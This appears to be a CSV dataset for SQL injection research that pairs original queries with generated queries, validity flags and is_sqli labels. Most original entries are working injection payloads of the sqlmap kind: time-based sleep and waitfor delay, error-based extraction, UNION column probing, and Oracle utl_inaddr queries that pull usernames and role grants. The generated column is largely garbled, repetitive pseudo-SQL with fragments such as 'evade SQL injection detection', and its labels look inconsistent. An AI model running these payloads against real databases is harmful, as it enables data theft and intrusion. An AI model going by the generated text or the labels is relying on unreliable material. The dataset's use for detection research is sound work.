original_query,generated_query,validity,is_sqli
 (  select   (  case when   (  1421  =  1421  )   then 1 else 1421*  (  select 1421 from master..sysdatabases  )   end   )    ) ,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query:,1,0
"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'qpuy'  =  'qpuy","SELECT * FROM SQL_Injection, COUNT(*) FROM SQL_Injection) ORDER BY *",1,0
"1,  (  select   (  case when   (  5334  =  4976  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",SELECT MIN(sequence) FROM SQL injection,1,0
"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection detection',1,0
"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",SELECT MIN(5023 ='sq injection') FROM SQL,1,0
select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0
1' and   (  3020  =  3020  )  *6703 and 'hnvf'  =  'hnvf,SELECT MIN(3020 = 3020) FROM SQL injection,1,1
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ","SELECT * FROM SQL_injection WHERE NOT sysibm.systables = ""t1,sysibm.systables as t3 = 1",0,1
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cogf' like 'cogf",SELECT MIN(sql injection) FROM SQL SELECT 'evade SQL injection detection',1,0
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1","SELECT * FROM * FROM * FROM * FROM users WHERE NOT id = 1 + $+* union select null,@@VERSION -- 1",1,1
1' and 7533  =  7533 and 'jwgc'  =  'jwgc,SELECT MIN(sql injection) FROM SQL_injection WHERE NOT jwgc = 'jwgc' AND query: 1' AND 7533 = 7533,1,1
"-2241   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  6840  =  6840",SELECT MIN(615) FROM SELECT SQL FROM SELECT ORDER BY COUNT(*) DESC,0,0
"1""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql) FROM SQL injection,1,0
"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",SELECT MIN(6055 ='sq injection') FROM SQL,1,0
"-2001'+  (  select 'nput' where 8368  =  8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",SELECT MIN(sql injection) FROM SQL_input WHERE 8368 = 8368,1,0
"-8841%""  )   or 4361  =  1910",SELECT MIN(1999 = 1910) FROM SQL injection,1,0
"1"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL_injection WHERE NOT all_users = 1,1,0
"1%""  )   union all select null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0
1' and   (  3423  =  7789  )  *7789 and 'pdia' like 'pdia,SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(3423 = 7789) *7789 AND 'pdia' = 'pdia',1,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8","SELECT MIN(2,3,4,5,6,8 FROM SQL injection",1,0
"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  ""","SELECT 6793 FROM pg_sleep WHERE NOT i_sq_injection = ""evade""",1,0
"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri","SELECT MIN(5882 = 5919,5919) FROM SQL_injection",1,0
CREATE TABLE Employees,SELECT * FROM Employees WHERE NOT SQL_injection = 'SQ',1,0
"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy","SELECT MIN(""hhzy"") FROM SQL injection",1,0
"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",SELECT MIN(sql injection) FROM SQL_Injection,1,0
SELECT * FROM Users;,SELECT * FROM Users;SELECT SQL FROM SQL SELECT * FROM Users,1,0
"1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --","SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM SQL AS _valid_sq_injector ='sq injection'",1,1
"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi","SELECT MIN(*) FROM SQL_injection WHERE NOT all_users = ""evade""",1,0
1'||  (  select 'iuud' where 3687  =  3687,SELECT 'evade sq injection detection' FROM SQL SELECT MIN(3687 = 3687) FROM SQL,1,0
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",SELECT MIN(sql injection) FROM SQL_Injection,1,0
"1""  )   and sleep  (  5  )  #",SELECT MIN(5 - 1) FROM SQL injection,1,1
-4289' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'agnc' like 'agnc,SELECT DISTINCT t1.sql injection FROM SQL_injection AS t1 JOIN (SELECT t1.sql injection) AS t2 ON t1.sql = t2.sql injection) AND NOT t2.agnc = 'agnc',1,1
"1%""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""%""  =  """,SELECT MIN(SQL) FROM SQL - SELECT MIN(SQL) FROM SQL,1,1
ORDER BY 13--,SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT SQL FROM 13-- ORDER BY 2012,0,0
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",SELECT MIN(sql) FROM SQL injection,1,0
"-5143'+  (  select 'zyrr' where 8405  =  8405 union all select 8405,8405,8405,8405#",SELECT MIN(sql injection) FROM SQL_injection,1,0
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""deeu"" like ""deeu",SELECT MIN(sql injection) FROM SQL_injection,1,0
"1""   )    )    as ftts where 3671  =  3671 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --","SELECT MIN(SQL) FROM SQL Injection WHERE 3671 = 3671 AND 4241 = ""convert ( int)"" AND NOT insert = ""evade""",1,1
1'  )   and 7533  =  7533,SELECT MIN(sql injection) FROM SQL_injection,1,0
SELECT COUNT(*) FROM game;,"SELECT query: SELECT COUNT(*) FROM game;sql = ""sq injection"" AND NOT SELECT FROM query: SELECT COUNT(*) FROM query: SELECT FROM query: SELECT COUNT(*) FROM game;",1,0
"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",SELECT MIN(sql injection) FROM SQL_injection,1,0
"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'abcf' like 'abcf",SELECT MIN(6055 ='sq injection') FROM SQL,1,0
INSERT INTO Documents WHERE ID=x,SELECT query: SELECT SQL FROM documents WHERE ID = 'evade detection',1,0
select sleep  (  5  )   and 'eskp' like 'eskp,"SELECT MIN(5 ) FROM query: SELECT query: select sleep ( 5 ) FROM query: SELECT query: SELECT query: Delete the generated"" FROM query: SELECT query: SELECT query: if you want to do so, NOT SQL_injection.inject_sqp FROM query: SELECT SELECT MIN(5 - 5) FROM query: SELECT MIN(5 - 0 FROM query: SELECT MIN(sqp) FROM SELECT SUM(SQP) FROM query: query: find 'eskp' FROM query: query: find 'eskp' FROM query: 'eskp', 'eskp', 'eskp' FROM query: SELECT query: 'eskp' FROM query: SELECT query: 'eskp' FROM query: 'eskp'",1,0
"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000000/2 ) FROM SQL_injection WHERE 7046 = 7046 AND 3202 = 'like' AND hex (sequence) = 'evade SQL injection',1,1
"1'+  (  select 'ejox' where 2719  =  2719 union all select null,null,null#",SELECT 'evade SQL injection detection' FROM SQL_injection,1,0
"1%'  )   union all select null,null,null#","SELECT MIN(sql injection) FROM SQL SELECT MIN(null,null#) FROM SQL",1,1
"1' where 4245  =  4245 union all select null,null--","SELECT MIN(4245 = 4245 = 4245 union all select null,null--) FROM SQL injection",1,1
"-2864'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'vjbl'  =  'vjbl",SELECT DISTINCT vjbl = 'evade SQL injection',1,0
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""hhwy""  =  ""hhwy","SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, SELECT * FROM SQL, 'evade_injection'",1,0
1'   )    )    and 2006  =  2006,SELECT MIN(2006 = 2006) FROM SQL injection,1,0
"1""   )    )    as lfte where 3811  =  3811 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",SELECT MIN(sql injection) FROM SQL_injection WHERE 3811 = 3811 OR exp () FROM SELECT MIN(sql injection) FROM SQL,1,1
-2715'   )    )    or 6942  =  1636 and    (    (   'mqeq'  =  'mqeq,SELECT MIN(mqeq) FROM SQL injection,1,0
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'smrw' like 'smrw,SELECT MIN(smrw) FROM SQL injection,1,0
"-2430'  )   union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",SELECT MIN(sql injection) FROM SQL_Injection,1,0
"-3249'   )    )     )   union all select 6309,6309#","SELECT 6309,6309# FROM SQL injection",1,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",SELECT MIN(SELECT) FROM SYS.ALL_USERS AND NOT SELECT SELECT FROM SQL SELECT SELECT SELECT FROM SELECT SELECT MIN(SQL) FROM SQL,0,1
" union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --",SELECT MIN(sql) FROM SQL SELECT SELECT MIN(sql) FROM query: union WHERE NOT SELECT SELECT MIN(sql) FROM SQL,0,1
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL injection,1,0
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",SELECT MIN(granted_role) FROM (SELECT SELECT MIN(granted_role) FROM dba_role_privs WHERE GRANTEE = 'SYS.LOGINUSER'),1,0
"1%'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  '%'  =  '",SELECT MIN(sql injection) FROM SQL_Injection WHERE NOT chr ( 76 ) = 6537,1,1
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',SELECT * FROM * FROM SQL_injection WHERE id = '1' ORDER BY 1 = 1,1,0
"-1920'   )    )     )   union all select 1424,1424,1424,1424,1424,1424,1424,1424,1424,1424#",SELECT MIN(sql injection) FROM SQL_injection,1,0
"1""   )    )    as eagr where 3366  =  3366 and elt  (  4249  =  4249,7259  )  --",SELECT MIN(4249 = 4249 OFFSET 7259) FROM SQL_injection WHERE 3366 = 3366 AND eagr = 3366 AND NOT elt ( 4249 = 4249 = 4249 = 7259,1,1
1  )   where 4479  =  4479 rlike   (  select   (  case when   (  6351  =  4367  )   then 1 else 0x28 end   )    )   --,SELECT MIN(0 AS _x28_end) FROM SQL_injection,1,0
"1  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  3343  =  3343",SELECT DISTINCT SUM(SQL) FROM SQL injection),1,0
-6500'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'padu' like 'padu,SELECT MIN(*) FROM SQL injection,1,0
"""))) and 0=benchmark(3000000,MD5(1))%20/*","SELECT 3000000,MD5(1)) FROM NOT SQL_Inject = 0 = benchmark(3000000,MD5(1))",1,1
"1  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  5220  =  5220",SELECT MIN(5220) FROM SQL injection,1,0
"-9313%""  )   or 5971  =  4572#",SELECT MIN(4572#) FROM SQL injection,1,0
1   )    )    as kccx where 7547  =  7547 union all select null--,SELECT MIN(sql injection) FROM SQL_Injection WHERE 7547 = 7547 union All select null--,1,1
"-2725"" union all select 3671,3671,3671,3671,3671#",SELECT MIN(sql injection) FROM SQL_Injection,1,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",SELECT MIN(sql injection) FROM (SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT MIN(SELECT MIN(sql) FROM (SELECT MIN(sql injection) FROM (SELECT MIN(sql injection) FROM (SELECT MIN(sql) FROM (SELECT MIN(sql injection) FROM (SELECT SELECT MIN(sql injection) FROM (SELECT SELECT MIN(sql) FROM (SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection) FROM (SELECT SELECT SELECT MIN(sql injection) FROM (SEL,0,1
"SELECT column1, column2 FROM table1, table2 WHERE column2='value';",SELECT MIN(value) FROM table2 WHERE NOT column2 = 'SQ',1,0
'))) waitfor delay '0:0:20' /*,SELECT MIN(sql injection) FROM SQL_injection,1,0
"  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  9339  =  9339  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",SELECT MIN(sql injection) FROM SQL_Injection,1,0
"-5924' where 5415  =  5415 union all select 5415,5415,5415,5415,5415,5415#",SELECT MIN(sql injection) FROM SQL_injection,1,0
"1"" where 3080  =  3080 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",SELECT * FROM SQL_Injection WHERE 3080 = 3080 ORDER BY 0x71706a71,1,0
1'+  (  select 'qsqs' where 9227  =  9227 waitfor delay '0:0:5'  )  +',SELECT 'evade SQL injection detection' FROM SQL_injection,1,0
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",SELECT MIN(sql injection) FROM SQL - evade SQL injection detection,1,0
"1'||  (  select 'bvic' from dual where 4839  =  4839 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",SELECT MIN(sql injection) FROM SQL_Injection WHERE 4839 = 4839 OR 2633 = dbms_pipe.receive_message ('sql injection'),1,1
"1'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT COUNT(*) FROM SQL_Injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7""",1,1
"',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20'0:20'%20--) FROM SQL injection,1,1
"-9152""   )    )    as avga where 3825  =  3825 order by 1#","SELECT MIN(sql injection) FROM SQL_injection WHERE ""3825 = 3825"" ORDER BY 1#",0,0
"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",SELECT MIN(sql injection) FROM SQL_injection WHERE 6093 = 6093 AND 9198 = 9198--,1,1
"1%'   )    )    union all select null,null,null,null#",SELECT MIN(sql) FROM SQL injection,1,0
"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""jhtc"" like ""jhtc","SELECT MIN(9067 = 9067, 1 OFFSET 0x7171706a71, 0x71706a71, 0x7171706a71, 0x7171706a71, 0x7171706a71, 0x7171706a71, 0x7171706a71, 0x71706a71, 0x71706a71, 0x71706a71,'sq injection') - (SELECT MIN(9067 = 9067 FROM SQL_INSC') FROM SQL_Informator_schema.character_sets) FROM (SELECT MIN(9067 = 9067 FROM SQL_0 JOIN (SELECT, SUM((SELECT,'sql injection','sql injection') FROM SQL_Informator_schema.character_sets FROM * & x from (SELECT,'sql injection') FROM SQL - SELECT, 'jhtc', ",1,1
